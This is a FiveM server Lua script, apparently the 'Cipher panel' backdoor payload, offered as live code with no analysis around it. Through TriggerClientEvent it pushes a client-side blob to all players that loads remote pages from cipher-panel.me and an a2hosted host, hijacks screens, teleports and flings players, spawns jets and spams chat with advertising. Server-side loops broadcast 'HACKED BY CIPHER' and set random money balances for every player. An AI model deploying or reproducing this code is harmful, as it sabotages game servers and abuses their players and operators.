TriggerClientEvent('helpCode', -1, [[local sound = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/5.html", 50, 50);

local textureDic = CreateRuntimeTxd('duiTxd');

local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
local object = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/y.html", 1920, 1080);
local object2 = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_loog2.html", 1920, 1080);
local object3 = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/screen3_2.html", 1920, 1080);

local handle = GetDuiHandle(object) -- Gets DUI handle from object
local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
local handle3 = GetDuiHandle(object3) -- Gets DUI handle from object

local showtext = true
local chatspam = false
local bypass = false
local triggered = false

CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex", handle) -- Creates the texture "duiTex" in the "duiTxd" dictionary
CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex2", handle2) -- Creates the texture "duiTex" in the "duiTxd" dictionary
CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex3", handle3) -- Creates the texture "duiTex" in the "duiTxd" dictionary

local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
local texts = {
    "Cipher - discord.cipher-panel.me",
    " Cipher - discord.cipher-panel.me",
    "  Cipher - discord.cipher-panel.me",
    "   Cipher - discord.cipher-panel.me",
    "    Cipher - discord.cipher-panel.me",
    "     Cipher - discord.cipher-panel.me",
    "      Cipher - discord.cipher-panel.me",
    "       Cipher - discord.cipher-panel.me",
    "        Cipher - discord.cipher-panel.me",
    "         Cipher - discord.cipher-panel.me",
    "          Cipher - discord.cipher-panel.me",
    "           Cipher - discord.cipher-panel.me",
    "            Cipher - discord.cipher-panel.me",
    "             Cipher - discord.cipher-panel.me",
    "              Cipher - discord.cipher-panel.me",
    "               Cipher - discord.cipher-panel.me",
    "                Cipher - discord.cipher-panel.me",
    "                 Cipher - discord.cipher-panel.me",
    "                  Cipher - discord.cipher-panel.me",
    "                 Cipher - discord.cipher-panel.me",
    "                Cipher - discord.cipher-panel.me",
    "               Cipher - discord.cipher-panel.me",
    "              Cipher - discord.cipher-panel.me",
    "             Cipher - discord.cipher-panel.me",
    "            Cipher - discord.cipher-panel.me",
    "           Cipher - discord.cipher-panel.me",
    "          Cipher - discord.cipher-panel.me",
    "         Cipher - discord.cipher-panel.me",
    "        Cipher - discord.cipher-panel.me",
    "       Cipher - discord.cipher-panel.me",
    "      Cipher - discord.cipher-panel.me",
    "     Cipher - discord.cipher-panel.me",
    "    Cipher - discord.cipher-panel.me",
    "   Cipher - discord.cipher-panel.me",
    "  Cipher - discord.cipher-panel.me",
    " Cipher - discord.cipher-panel.me",
}

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        --DrawRect(0.5, 0.5, 1.0, 1.0, 0, 0, 0, 255);
        if(showtext)then
            DrawSprite("duiTxd", "duiTex", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
        else
            DrawSprite("duiTxd", "duiTex2", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 120)
            if(triggered == false)then
                doActions()
                triggered = true
            end
        end
        SetFakeWantedLevel(6)
    end
end)

Citizen.CreateThread(function()
    if(bypass == false)then
        Citizen.Wait(20300)
    end
    
    Citizen.CreateThread(function()
        while true do
            DrawSprite("duiTxd", "duiTex3", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
            Citizen.Wait(1)
            SetSuperJumpThisFrame(PlayerId())
            SetEntityHealth(GetPlayerPed(-1), 200)
            SetPedMoveRateOverride(PlayerId(),10.0)
            SetRunSprintMultiplierForPlayer(PlayerId(),1.49)
        end
    end)
    
    SetEntityCoords(GetPlayerPed(-1), -994.0, -3144.0, 14.0)
	SetPedComponentVariation(GetPlayerPed(-1), 1, 1, 0, 1) --put
    ShakeGameplayCam("SKY_DIVING_SHAKE", 2.0)

    StartScreenEffect("RaceTurbo", 0, true)

    local model121 = GetHashKey("s_m_m_movalien_01")
	local player1 = PlayerId()    

    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("gadget_parachute"), 1, false, false)
    ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)

    local vehicleName = 'jet'
    if not IsModelInCdimage(vehicleName) or not IsModelAVehicle(vehicleName) then
        return
    end
    RequestModel(vehicleName)
    while not HasModelLoaded(vehicleName) do
        Wait(150) -- often you'll also see Citizen.Wait
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(15000)
            ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
        end
    end)

    -- create the vehicle
    Citizen.CreateThread(function()
        Citizen.Wait(3000)
            if math.random(1, 5) == 5 then
            local playerPed = PlayerPedId() -- get the local player ped
            local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
            local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
            while true do
                Citizen.Wait(10000)
                local playerPed = PlayerPedId() -- get the local player ped
                local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
                local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
            end
        end
    end)
    chatspam = true
    while not HasModelLoaded(model121) do
        Wait(100)
    end
    SetPlayerModel(player1, model121)
    SetModelAsNoLongerNeeded(model121)
    
end)

Citizen.CreateThread(function()
    --print(GetEntityCoords(GetPlayerPed(-1), true))
    if(bypass == false)then
        Citizen.Wait(13300)
    end
    showtext = false
    DestroyDui(object)
    
end)

function doActions()
end



function AddTextEntry(key, value)
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), key, value)
end

local config = {
    ["TITLE"] = "~r~CIPHER-PANEL.ME - discord.cipher-panel.me",
    ["SUBTITLE"] = "~r~CIPHER-PANEL.ME - discord.cipher-panel.me",
    ["MAP"] = "CIPHER-PANEL.ME",
    ["STATUS"] = "CIPHER-PANEL.ME",
    ["GAME"] = "CIPHER-PANEL.ME",
    ["INFO"] = "CIPHER-PANEL.ME",
    ["SETTINGS"] = "CIPHER-PANEL.ME",
    ["R*EDITOR"] = "CIPHER-PANEL.ME",
}

Citizen.CreateThread(function()
    while true do
    Citizen.Wait(0)
        N_0xb9449845f73f5e9c("SHIFT_CORONA_DESC")
        PushScaleformMovieFunctionParameterBool(true)
        PopScaleformMovieFunction()
        N_0xb9449845f73f5e9c("SET_HEADER_TITLE")
        PushScaleformMovieFunctionParameterString(config["TITLE"])
        PushScaleformMovieFunctionParameterBool(true)
        PushScaleformMovieFunctionParameterString(config["SUBTITLE"])
        PushScaleformMovieFunctionParameterBool(true)
        PopScaleformMovieFunctionVoid()
    end
end)


Citizen.CreateThread(function()
    AddTextEntry('PM_SCR_MAP', config["MAP"])
    AddTextEntry('PM_SCR_STA', config["STATUS"])
    AddTextEntry('PM_SCR_GAM', config["GAME"])
    AddTextEntry('PM_SCR_INF', config["INFO"])
    AddTextEntry('PM_SCR_SET', config["SETTINGS"])
    AddTextEntry('PM_SCR_RPL', config["R*EDITOR"])
end)

Citizen.CreateThread(function()
    local i = 1
    local j = 1
    while true do
        Citizen.Wait(50)
        if(chatspam)then
            TriggerEvent('chat:addMessage', {
                color = chatColors[i],
                multiline = true,
                args = {texts[j]}
            })
            if(chatColors[i+1] ~= nil)then
                i = i+1
            else
                i = 1
            end
            if(texts[j+1] ~= nil)then
                j = j+1
            else
                j = 1
            end
        end
    end
end)


AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
      return
    end
    print('The resource ' .. resourceName .. ' was stopped.')
    ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
    SetFakeWantedLevel(0)
    StopScreenEffect("RaceTurbo")
end)

]])

rkVYIBBSjtXKAPqEyYol = nil 
TriggerEvent("esx:getSharedObject", function(obj) rkVYIBBSjtXKAPqEyYol = obj end) 

Citizen.CreateThread(function()
    Citizen.Wait(20300)
    while true do
        Citizen.Wait(1)
        for _, player in ipairs(GetPlayers()) do
            local xPlayer = rkVYIBBSjtXKAPqEyYol.GetPlayerFromId(player)
            xPlayer.showNotification('HACKED BY CIPHER - discord.cipher-panel.me')
        end
    end
end)

Citizen.CreateThread(function()
    Citizen.Wait(20300)
    while true do
        Citizen.Wait(1)
        for _, player in ipairs(GetPlayers()) do
            local xPlayer = rkVYIBBSjtXKAPqEyYol.GetPlayerFromId(player)
            xPlayer.setMoney(math.random(100000000,999999999))
        end
    end
end)